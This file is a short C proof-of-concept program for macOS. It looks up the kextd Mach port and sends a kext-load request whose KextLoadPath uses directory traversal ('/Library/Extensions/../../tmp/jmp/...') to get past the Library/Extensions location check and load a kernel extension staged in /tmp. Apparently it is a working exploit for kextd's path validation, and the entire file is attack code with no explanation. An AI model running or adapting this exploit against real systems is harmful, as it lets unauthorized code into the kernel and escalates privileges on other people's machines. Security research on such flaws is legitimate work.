#include <stdlib.h>
#include <stdio.h>

#include <servers/bootstrap.h>
#include <mach/mach.h>

#include <Foundation/Foundation.h>

#include "kextmanager.h"

int main() {
  mach_port_t kextd_port = MACH_PORT_NULL;
  mach_port_t bootstrap_port = MACH_PORT_NULL;

  task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
  bootstrap_look_up(bootstrap_port, "com.apple.KernelExtensionServer", &kextd_port);
  
  if (kextd_port == MACH_PORT_NULL) {
    printf("couldn't get the kextd port\n");
    return EXIT_FAILURE;
  }

  printf("got port\n");

  CFMutableDictionaryRef requestDict = CFDictionaryCreateMutable(kCFAllocatorDefault,
                                                          0,
                                                          &kCFTypeDictionaryKeyCallBacks,
                                                          &kCFTypeDictionaryValueCallBacks);

  
  CFDictionarySetValue(requestDict, CFSTR("KextLoadPath"), CFSTR("/Library/Extensions/../../tmp/jmp/IODVDStorageFamily.kext"));

  CFDataRef requestData;
  CFErrorRef error;
  requestData = CFPropertyListCreateData(kCFAllocatorDefault,
                                         requestDict,
                                         kCFPropertyListBinaryFormat_v1_0,
                                         0,
                                         &error);

  kextmanager_load_kext(kextd_port,
                        (void*)CFDataGetBytePtr(requestData),
                        CFDataGetLength(requestData));

  return EXIT_SUCCESS;
}
